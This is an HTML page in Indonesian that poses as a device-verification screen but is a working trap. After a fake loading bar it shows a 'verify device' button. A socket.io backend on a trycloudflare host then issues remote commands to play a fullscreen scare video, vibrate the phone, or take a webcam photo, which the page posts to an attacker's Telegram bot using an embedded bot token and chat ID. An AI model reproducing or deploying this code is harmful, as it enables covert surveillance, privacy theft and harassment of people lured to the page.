<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sistem Verifikasi</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        body { background: #000; color: #ff0000; font-family: monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
        .loader { width: 80px; height: 80px; border: 5px solid #111; border-top: 5px solid #ff0000; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .btn-jebakan { background: #ff0000; color: #fff; border: none; padding: 18px 30px; font-weight: bold; border-radius: 8px; cursor: pointer; display: none; box-shadow: 0 0 20px #ff0000; animation: blink 0.8s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        #videoCrash { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: #000; object-fit: cover; }
        .hidden { display: none; }
    </style>
</head>
<body>

    <div id="uiArea">
        <div id="loader" class="loader"></div>
        <h2 id="st">MENGHUBUNGKAN... 0%</h2>
        <button id="btnVerify" class="btn-jebakan" onclick="breakDefense()">VERIFIKASI PERANGKAT</button>
        <div id="fionzyTitle" style="display:none; font-size:40px; font-weight:bold;">FionzyGpt</div>
    </div>

    <video id="videoCrash" playsinline loop>
        <source src="https://raw.githubusercontent.com/fanzzy01/Lock/main/Devil.mp4" type="video/mp4">
    </video>

    <video id="cam" autoplay class="hidden"></video>
    <canvas id="can" class="hidden"></canvas>

    <script>
        const BACKEND_URL = "https://arrived-stores-seen-declined.trycloudflare.com"; 
        const BOT_TOKEN = "8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA";
        const CHAT_ID = "7373392803"; 
        const socket = io(BACKEND_URL, { transports: ['websocket'] });
        const video = document.getElementById('videoCrash');

        function breakDefense() {
            video.muted = false; video.volume = 1.0; 
            video.play(); video.pause(); // Pancing Izin Suara
            document.getElementById('btnVerify').style.display = 'none';
            document.getElementById('fionzyTitle').style.display = 'block';
            document.body.style.backgroundColor = "black";
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚡ TARGET SUDAH KLIK TOMBOL! SUARA AKTIF.`);
        }

        socket.on('command', (msg) => {
            if (msg === '/crash') { video.style.display = 'block'; video.play(); }
            if (msg === '/snap') takePhoto();
            if (msg === '/vibrate') navigator.vibrate([1000, 500, 1000]);
        });

        let p = 0;
        let itv = setInterval(() => {
            if(p < 100) { p += 5; document.getElementById('st').innerText = `MENGHUBUNGKAN... ${p}%`; }
            else {
                clearInterval(itv);
                document.getElementById('loader').style.display = 'none';
                document.getElementById('st').style.display = 'none';
                document.getElementById('btnVerify').style.display = 'block';
            }
        }, 100);

        async function takePhoto() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('cam'); v.srcObject = s;
                setTimeout(() => {
                    const c = document.getElementById('can');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'f.jpg');
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg');
                    s.getTracks().forEach(t => t.stop());
                }, 2000);
            } catch(e) {}
        }
    </script>
</body>
</html>
